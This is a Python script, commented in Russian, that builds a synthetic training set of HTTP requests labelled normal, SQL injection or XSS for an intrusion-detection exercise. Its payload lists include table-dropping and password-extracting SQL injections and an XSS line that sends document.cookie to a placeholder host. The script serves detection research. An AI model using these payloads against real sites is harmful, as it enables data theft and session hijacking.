"""
Генератор учебного синтетического текстового датасета HTTP-запросов.

Нужен, когда нельзя скачать открытые наборы SQLi/XSS (нет сети). Создаёт
data/http_requests.csv со столбцами request,label,timestamp, где
label ∈ {Normal, SQL Injection, XSS}. Шаблоны — хрестоматийные строки из
учебных материалов (OWASP), с вариацией регистра, пробелов и URL-кодирования.
Датасет синтетический: метрики на нём завышены относительно реальных данных.

Запуск:  python scripts/generate_text_data.py [--per-class 1500]
"""
from __future__ import annotations

import argparse
import random
import sys
from pathlib import Path
from urllib.parse import quote

import numpy as np
import pandas as pd

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import config  # noqa: E402

PATHS = ["/search", "/product", "/catalog", "/user", "/blog/post", "/cart/add",
         "/api/items", "/order/view", "/login", "/news", "/category", "/profile"]
PARAMS = ["q", "id", "name", "page", "user", "category", "sort", "item", "query", "ref"]
WORDS = ["python", "book", "red", "shoes", "laptop", "guide", "coffee", "travel", "music",
         "select a size", "drop shipping", "union membership", "javascript course",
         "o'reilly", "update policy", "script writing", "alert settings", "order status",
         "insert coin", "delete account help", "news today", "winter jacket", "phone case"]


def _normal(r: random.Random) -> str:
    p = r.choice(PATHS)
    kind = r.random()
    if kind < 0.45:
        return f"{p}?{r.choice(PARAMS)}={quote(r.choice(WORDS)).replace('%20', '+')}"
    if kind < 0.8:
        return f"{p}?{r.choice(PARAMS)}={r.randint(1, 99999)}&{r.choice(PARAMS)}={r.choice(WORDS).split()[0]}"
    return f"{p}/{r.randint(1, 5000)}/{r.choice(WORDS).split()[0]}"


SQLI = [
    "' OR '1'='1", "' OR 1=1--", "\" OR \"\"=\"", "admin'--", "1 OR 1=1",
    "1' UNION SELECT NULL,NULL--", "1 UNION SELECT username,password FROM users",
    "'; DROP TABLE users;--", "1; SELECT pg_sleep(5)--", "1' AND SLEEP(5)--",
    "' OR 'a'='a", "1' ORDER BY 3--", "x' AND (SELECT COUNT(*) FROM users)>0--",
    "') OR ('1'='1", "1 AND 1=CONVERT(int,@@version)", "' UNION ALL SELECT table_name FROM information_schema.tables--",
    "1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
    "' OR ''='", "1'/**/OR/**/1=1#", "0 OR 2>1",
]
XSS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
    "\"><script>alert(document.cookie)</script>", "<body onload=alert('x')>",
    "javascript:alert(1)", "<iframe src=javascript:alert(1)>", "<a href=\"javascript:alert(1)\">x</a>",
    "'><img src=x onerror=prompt(1)>", "<script src=//example.test/x.js></script>",
    "<input onfocus=alert(1) autofocus>", "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>", "<script>document.location='//e.test/?'+document.cookie</script>",
    "<div onmouseover=\"alert(1)\">hover</div>", "<video><source onerror=alert(1)>",
]


def _mutate(r: random.Random, s: str) -> str:
    if r.random() < 0.3:
        s = "".join(c.upper() if r.random() < 0.5 else c.lower() for c in s)
    if r.random() < 0.25:
        s = s.replace(" ", r.choice(["+", "%20", "/**/"]))
    return quote(s, safe="'\"<>=()/*-,;:@.#") if r.random() < 0.35 else s


def _attack(r: random.Random, pool: list[str]) -> str:
    base = r.choice(pool)
    prefix = r.choice(["", str(r.randint(1, 999)), r.choice(WORDS).split()[0]])
    return f"{r.choice(PATHS)}?{r.choice(PARAMS)}={_mutate(r, prefix + base)}"


def build(per_class: int, seed: int = config.RANDOM_STATE) -> pd.DataFrame:
    r = random.Random(seed)
    rows = []
    for label, fn in [("Normal", _normal),
                      ("SQL Injection", lambda rr: _attack(rr, SQLI)),
                      ("XSS", lambda rr: _attack(rr, XSS))]:
        seen: set[str] = set()
        while len(seen) < per_class:
            seen.add(fn(r))
        rows += [{config.TEXT_COL: s, config.TEXT_LABEL_COL: label} for s in seen]
    df = pd.DataFrame(rows).sample(frac=1, random_state=seed).reset_index(drop=True)
    rng = np.random.default_rng(seed)
    ts = pd.Timestamp("2026-09-01 08:00") + pd.to_timedelta(
        np.sort(rng.uniform(0, 8 * 3600, len(df))), unit="s")
    df[config.TEXT_TIME_COL] = ts.strftime("%Y-%m-%d %H:%M:%S")
    return df


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--per-class", type=int, default=1500)
    a = ap.parse_args()
    config.DATA_DIR.mkdir(parents=True, exist_ok=True)
    d = build(a.per_class)
    d.to_csv(config.TEXT_DATA_PATH, index=False)
    print(f"Записано {len(d)} строк в {config.TEXT_DATA_PATH}")
    print(d[config.TEXT_LABEL_COL].value_counts().to_string())
